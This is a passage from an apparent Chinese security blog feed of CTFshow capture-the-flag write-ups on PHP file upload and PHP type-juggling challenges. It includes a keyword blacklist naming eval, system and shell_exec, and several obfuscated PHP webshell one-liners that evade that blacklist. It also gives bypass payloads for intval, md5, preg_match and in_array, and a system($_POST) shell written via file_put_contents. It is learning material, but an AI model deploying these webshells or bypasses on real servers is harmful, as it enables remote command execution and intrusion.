keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'./upload/'</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=></span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=></span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=></span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=></span><span class="token string double-quoted-string">"文件类型不合规"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/eval|assert|assert|_POST|_GET|_COOKIE|system|shell_exec|include|require/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>本来还想着包含一波日志。</p><p><strong>字符拼接</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'syste'</span><span class="token operator">.</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls ../'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><strong>$_REQUEST</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><strong>数学函数</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$pi</span><span class="token operator">=</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">37907361743</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">1598506324</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">&#123;</span>abs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">&#123;</span>acos<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># get传参   abs=system&amp;acos=ls</span></span></code></pre><p><a href="https://yanmie-art.github.io/2020/10/30/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6web%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">这里</a></p><p><strong>其他函数构造</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"s#y#s#t#e#m"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"#"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1s'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'ystem'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'metsys'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web169"><a href="#web169" class="headerlink" title="web169"></a>web169</h4><p>日志包含</p><p>不过index.php需要自己上传</p><h4 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h4><p>同169</p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门-php</title>
      <link href="/2024/06/29/web%E5%85%A5%E9%97%A8-php/"/>
      <url>/2024/06/29/web%E5%85%A5%E9%97%A8-php/</url>
      
        <content type="html"><![CDATA[<h4 id="web89-数组绕过"><a href="#web89-数组绕过" class="headerlink" title="web89(数组绕过)"></a>web89(数组绕过)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>分析上面的代码可以看出，正则匹配0-9，匹配到则返回true，直接die，但是由于preg_match()只能处理字符串，当传入的是数组时将会返回false,从而绕过死亡函数。</p><p>**intval()<strong>函数用于获取变量的整数值。</strong>intval()**函数通过使用指定的进制 base 转换（默认是十进制），返回变量var的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。也就是说，当给intval()函数传入一个非空的数组时，intval()函数将会返回1，结合我们preg_match()传入数组返回false的特性，这道题的payload就很清楚了。</p><p>Payload:<code>?num[]=1</code></p><h4 id="web90-intval"><a href="#web90-intval" class="headerlink" title="web90(intval)"></a>web90(intval)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">===</span><span class="token string double-quoted-string">"4476"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>intval($var,$base)，其中var必填，base可选，这里base&#x3D;0,则表示根据var开始的数字决定使用的进制： 0x或0X开头使用十六进制，0开头使用八进制，否则使用十进制。</p><p>这里&#x3D;&#x3D;&#x3D;表示类型和数值必须相等，我们可以使用4476的八进制或十六进制绕过检测。</p><p>Paylod：</p><blockquote><p>num&#x3D;010574</p><p>num&#x3D;0x117c</p></blockquote><p>intval() 还有一个特性。输入的值如果是字符串，它返回的内容取决于第一个字符左侧的数字。如 intval(‘11a22’)&#x3D;11。</p><blockquote><p>num&#x3D;4476a</p><p>num&#x3D;+4476</p><p>…</p></blockquote><p>根据以下解释，可以传入一个数组来绕过不含数字而且intval取整数</p><p><a href="https://www.nssctf.cn/problem/2076">[NSSCTF 2022 Spring Recruit]babyphp</a></p><pre class="language-none"><code class="language-none">通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 int 数值。 intval() 不能用于 object，否则会产生 E_WARNING 错误并返回 1。 echo intval(array());                 &#x2F;&#x2F; 0echo intval(array(&#39;foo&#39;, &#39;bar&#39;));     &#x2F;&#x2F; 1</code></pre><h4 id="web91-preg-match-m"><a href="#web91-preg-match-m" class="headerlink" title="web91(preg_match  &#x2F;m)"></a>web91(preg_match  &#x2F;m)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^php$/im'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^php$/i'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'nonononono'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </code></pre><p><a href="https://blog.csdn.net/qq_46091464/article/details/108278486">Apache HTTPD 换行解析漏洞(CVE-2017-15715)与拓展</a></p><p>考察了preg_match的&#x2F;m模式  </p><p>im模式是可以匹配很多行  i模式只能匹配一行</p><p>%0a换行，相当于enter</p><p>Payload：</p><blockquote><p>cmd&#x3D;%0aphp</p><p>cmd&#x3D;php%0a1</p></blockquote><h4 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h4><p>和90很像不过第一个比较并不是强类型，所以不能使用简单的4476a或者4476.来绕过，其他都可以</p><h4 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h4><p>过滤了所有字母但是可以使用8进制</p><p>Payload: <code>num=010574</code></p><h4 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">===</span><span class="token string double-quoted-string">"4476"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]/i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>这段代码中的 if(!strpos($num, “0”)){} 行使用了 PHP 中的 strpos() 函数，它的作用是在字符串中查找特定子字符串第一次出现的位置。逐步解释这段代码的逻辑： 1.strpos($num, “0”)：这部分代码调用了 strpos() 函数，用于在 $num 变量中查找字符 “0” 第一次出现的位置。如果找到了，则返回该位置的索引值（索引值从0开始），如果没有找到，则返回 false。</p><p>所以开始不能有0，但是必须得有0，而且刚好第一个换成了强比较，所以可以使用4476.0</p><p>看其他wp是在前面加一个空格，也就是%20也可以使用%0a</p><h4 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h4><p>第一个改回去了，所以不能用4476.0其他Payload可以</p><h4 id="web96-绕过"><a href="#web96-绕过" class="headerlink" title="web96(.&#x2F;绕过)"></a>web96(.&#x2F;绕过)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>在Linux下.&#x2F;表示当前目录</p><p>Payload:<code>u=./flag.php</code></p><h4 id="web97-md5数组绕过"><a href="#web97-md5数组绕过" class="headerlink" title="web97(md5数组绕过)"></a>web97(md5数组绕过)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span> </code></pre><p>这一道题涉及到了强比较的md5类型，从代码我们可以得知，要求a、b两个值不一样但是需要这两个值得md5值一样，因此强比较类型，我们可以利用md5函数处理数组类型会返回false的特性，从而利用false&#x3D;false来绕过。</p><p><a href="https://www.freebuf.com/articles/web/321300.html">CTF知识点： 关于PHP运算符&#x3D;&#x3D;&#x3D; 与&#x3D;&#x3D;的总结</a></p><h4 id="web98-三元运算符和传址-引用"><a href="#web98-三元运算符和传址-引用" class="headerlink" title="web98(三元运算符和传址(引用) )"></a>web98(三元运算符和传址(引用) )</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_SERVER</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_FLAG'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$flag</span><span class="token punctuation">:</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>看完一头雾水</p><p><a href="https://www.php.cn/php-notebook-172859.html">php函数的传值与传址(引用)详解</a></p><p>考点是PHP里面的三元运算符和传址(引用) 传址(引用)有点像c语言里面的地址 我们可以修改一下代码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">;</span><span class="token comment">//只要有输入的get参数就将get方法改变为post方法(修改了get方法的地址)</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span></span></code></pre><p>所以我们只需要 GET一个?1(因为GET传值调用了POST，所以无所谓) 加 POST一个HTTP_FLAG&#x3D;flag </p><h4 id="web99-in-array"><a href="#web99-in-array" class="headerlink" title="web99(in_array)"></a>web99(in_array)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$allow</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置为数组</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">36</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x36d</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$allow</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//向数组里面插入随机数</span><span class="token punctuation">&#125;</span> i<span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$allow</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//in_array()函数有漏洞 没有设置第三个参数 就可以形成自动转换eg:n=1.php自动转换为1</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//写入1.php文件 内容是&lt;?php system($_POST[1]);</span><span class="token delimiter important">?></span></span>&#125;?></code></pre><p>array_push——往数组尾部插入元素<br>rand(1,$i)——随机生成1-877之间的数<br>&#x2F;&#x2F;所以array_push($allow, rand(1,$i))就是往数组中插入1-877之间的数字<br>in_array——搜索数组中是否存在指定的值:<br>in_array(search,array,type)<br>search为指定搜索的值<br>array为指定检索的数组<br>type为TRUE则 函数还会检查 search的类型是否和 array中的相同</p><p>综上，我们可以发现数组中的值是int，而在弱类型中当php字符串和int比较时,字符串会被转换成int，所以 字符串中数字后面的字符串会被忽略。题目中的in_array没有设置type,我们可以输入字符串5.php(此处数字随意，只要在rand(1,0x36d)之间即可)，转换之后也就是5</p><p>看到file_put_contents，可以使用php伪协议</p><h4 id="web100-is-numeric-运算符优先级"><a href="#web100-is-numeric-运算符优先级" class="headerlink" title="web100(is_numeric 运算符优先级)"></a>web100(is_numeric 运算符优先级)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token 